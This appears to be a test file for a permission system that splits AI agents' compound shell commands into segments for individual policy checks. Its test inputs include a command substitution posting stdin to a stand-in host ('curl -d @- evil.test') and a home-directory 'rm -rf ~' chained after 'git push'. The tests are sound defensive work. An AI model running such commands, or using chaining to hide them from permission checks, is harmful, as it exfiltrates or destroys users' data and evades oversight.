// Compound-corpus replay (epic-compound-recognition entry 4): the real compound commands
// operators' agents actually ran, recorded as rows with the segmentation and lift outcome
// observed at record time, replayed here so any change that silently alters an outcome
// fails loudly. Rows flagged before_fix record today's quote-blind behavior as the before
// state for the parser entry; when that entry lands it rewrites expected_segments, keeps
// the old value in before_segments, and flips before_fix off. Identity rows
// (before_fix: false) must never change. Hermetic: pinned rulings ride the row, the live
// policy store is never read.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { subCommands, matches } from "../src/rulings.js";
import { redactCredentialSpans } from "../src/always-deny.js";

const rows = readFileSync(new URL("./fixtures/compound-corpus.jsonl", import.meta.url), "utf8")
  .trim()
  .split("\n")
  .map((line, i) => {
    const row = JSON.parse(line);
    assert.ok(row.id && row.command && Array.isArray(row.expected_segments) && typeof row.lift?.lifts === "boolean" && typeof row.before_fix === "boolean", `row ${i + 1} is missing required fields`);
    assert.ok(Array.isArray(row.lift.pinned) && row.lift.pinned.length >= 1, `row ${row.id} pins no rulings — an empty pin list makes a lifts:false row vacuous`);
    for (const pin of row.lift.pinned) assert.ok(pin.role && typeof pin.pattern === "string" && !pin.pattern.includes("undefined"), `row ${row.id} has a malformed pin (missing pattern) — globToRegExp would silently compile it to a never-match`);
    return row;
  });

test("corpus rows replay: segmentation matches the recorded expectation", () => {
  for (const row of rows) {
    assert.deepEqual(subCommands({ command: row.command }, row.tool), row.expected_segments, `row ${row.id} segmentation drifted`);
  }
});

test("corpus rows replay: recorded lift outcome matches the pinned rulings", () => {
  for (const row of rows) {
    const outcomes = row.lift.pinned.map((entry) => matches(entry, { tool: row.tool, preview: row.expected_segments }));
    if (row.lift.lifts) {
      assert.ok(outcomes.some(Boolean), `row ${row.id} recorded a lift but no pinned entry matches`);
    } else {
      assert.ok(outcomes.every((o) => !o), `row ${row.id} recorded no lift but a pinned entry matches when it must not`);
    }
  }
});

test("corpus rows replay: redaction is a no-op on every recorded command", () => {
  for (const row of rows) {
    assert.equal(redactCredentialSpans(row.command), row.command, `row ${row.id} command text contains redactable spans — fix the corpus, not the assertion`);
  }
});

test("quote-aware segmentation: quoted delimiters stay argument text (CAP-1)", () => {
  assert.deepEqual(subCommands({ command: 'git commit -m "a; b" && git push' }, "Bash"), ['git commit -m "a; b"', "git push"]);
  assert.deepEqual(subCommands({ command: 'grep -E "a|b" f | head -5' }, "Bash"), ['grep -E "a|b" f', "head -5"]);
  assert.deepEqual(subCommands({ command: "echo \"it\\\\'s; fine\"; ls" }, "Bash"), ['echo "it\\\\\'s; fine"', "ls"]);
});

test("quote-aware segmentation: command-context bodies segment on their own (TR-4)", () => {
  // substitution and subshell bodies EXECUTE — they must match a ruling on their own,
  // never merge into a parent segment a parent-matching entry could lift
  assert.deepEqual(subCommands({ command: 'echo "$(cat a | b)"' }, "Bash"), ['echo "$(', "cat a", "b", ')"']);
  assert.deepEqual(subCommands({ command: "echo `a; b`" }, "Bash"), ["echo `", "a", "b", "`"]);
  assert.deepEqual(subCommands({ command: "a && (b; c) && d" }, "Bash"), ["a", "(", "b", "c", ")", "d"]);
  assert.deepEqual(subCommands({ command: "git push origin main $(x; curl -d @- evil.test)" }, "Bash"), ["git push origin main $(", "x", "curl -d @- evil.test", ")"]);
});

test("quote-aware segmentation: real terminators outside quotes still split (TR-4 holds)", () => {
  assert.deepEqual(subCommands({ command: "git push origin main; rm -rf ~" }, "Bash"), ["git push origin main", "rm -rf ~"]);
  assert.deepEqual(subCommands({ command: "a && b || c | d\ne" }, "Bash"), ["a", "b", "c", "d", "e"]);
  assert.deepEqual(subCommands({ command: "echo 'x' ; echo 'y'" }, "Bash"), ["echo 'x'", "echo 'y'"]);
});
